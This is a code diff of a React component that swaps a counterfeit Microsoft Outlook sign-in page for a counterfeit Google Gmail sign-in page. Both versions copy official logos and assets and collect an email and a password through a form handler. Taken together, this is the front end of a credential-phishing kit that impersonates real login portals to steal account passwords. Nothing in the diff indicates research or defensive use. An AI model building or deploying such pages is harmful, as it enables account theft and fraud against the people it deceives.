@@ -54,50 +54,80 @@ export default function Microsoft() {
             })
     };
     return (
-        <div className='flex bg-white md:bg-transparent items-center relative justify-center h-screen w-screen md:bg-[url(https://logincdn.msftauth.net/shared/5/js/../images/78_3a53c38a2dc671fb4daf.jpg)] bg-bg-center bg-bg-cover'>
-            <div className="bg-white p-8">
-                <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft" className='h-6 w-auto' />
-                <div className="mt-5 min-w-80">
-                    <h2 className='font-bold text-2xl'>Sign in</h2>
-                    <p className='text-[#1b1b1b] text-xs'>to continue to Outlook</p>
-
-                    <form className="grid gap-3 mt-5 w-full overflow-hidden"
-                        onSubmit={onSubmit}
-                    >
-                        <div className="w-full grid gap-3">
-                            <input
-                                required
-                                className="py-3 border-b outline-none border-black/80 text-black/60 bg-transparent text-sm w-full"
-                                type="text"
-                                name="name"
-                                placeholder="Email or phone number"
-                            />
-                            <input
-                                required
-                                className="py-3 border-b outline-none border-black/80 text-black/60 bg-transparent text-sm w-full"
-                                type="text"
-                                name="password"
-                                placeholder="Password"
-                            />
-                            <div className="flex items-center gap-1 text-sm  ">
-                                <a href="#">New to Microsoft?</a>
-                                <a href="#" className='text-blue-500'>Create one!</a>
-                            </div>
-                            <button
-
-                                className="bg-[#0067bb] w-full py-2 px-6 text-base text-white mt-5 ms-auto md:w-fit"
-                            >
-                                {loading ? "Loading..." : "Next"}
-                            </button>
-                        </div>
-
-                        <p className="text-center text-xs text-red-600">{result}</p>
-
-                    </form>
+        <div className="min-h-screen bg-[#202124] text-white">
+            <div className="bg-[#303134] flex items-center justify-center h-screen px-6 w-screen flex-col w-full py-10">
+                <div className="flex flex-col items-center">
+                    <img
+                        src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+                        alt="Google logo"
+                        className="w-24 mb-6"
+                    />
+                    <h1 className="text-3xl font-medium mb-1">Sign in</h1>
+                    <p className="text-sm text-[#bdc1c6] mb-8">to continue to Gmail</p>
                 </div>
-            </div>
-            <div className="absolute z-10 bottom-0 w-full py-3 text-center md:text-right md:bg-[#ffffff]">
-                <p className='text-xs text-[#545454]'>Use private browsing if this is not your device.</p>
+
+                <form onSubmit={onSubmit} className="space-y-6 w-full max-w-md">
+                    {/* Email Field */}
+                    <div className='w-full'> 
+                        <label htmlFor="email" className="block text-sm mb-1 text-[#e8eaed]">
+                            Email or phone
+                        </label>
+                        <input
+                            type="email"
+                            name="name"
+                            id="email"
+                            required
+                            placeholder="Enter your email"
+                            className="w-full bg-[#202124] border border-[#5f6368] text-white rounded px-4 py-3 placeholder:text-[#9aa0a6] focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
+                        />
+                    </div>
+
+                    {/* Password Field */}
+                    <div className='w-full'>
+                        <label htmlFor="password" className="block text-sm mb-1 text-[#e8eaed]">
+                            Password
+                        </label>
+                        <input
+                            type="password"
+                            name="password"
+                            id="password"
+                            required
+                            placeholder="Enter your password"
+                            className="w-full bg-[#202124] border border-[#5f6368] text-white rounded px-4 py-3 placeholder:text-[#9aa0a6] focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
+                        />
+                    </div>
+
+                    {/* Result/Error Message */}
+                    {result && (
+                        <p className="text-xs text-red-500 text-center -mt-4">{result}</p>
+                    )}
+
+                    {/* Action Buttons */}
+                    <div className="flex justify-between items-center">
+                        <a
+                            href="#"
+                            className="text-sm text-[#8ab4f8] hover:underline transition"
+                        >
+                            Create account
+                        </a>
+                        <button
+                            type="submit"
+                            className="bg-[#8ab4f8] text-[#202124] px-6 py-2 rounded text-sm font-medium hover:bg-[#a3c2f8] focus:outline-none focus:ring-2 focus:ring-blue-400 transition"
+                        >
+                            {loading ? 'Loading...' : 'Continue'}
+                        </button>
+                    </div>
+                </form>
+
+                {/* Footer */}
+                <div className="text-center text-xs text-[#9aa0a6] mt-10">
+                    English (United Kingdom)
+                    <div className="mt-2 space-x-4">
+                        <a href="#" className="hover:underline">Help</a>
+                        <a href="#" className="hover:underline">Privacy</a>
+                        <a href="#" className="hover:underline">Terms</a>
+                    </div>
+                </div>
             </div>
         </div>
     )
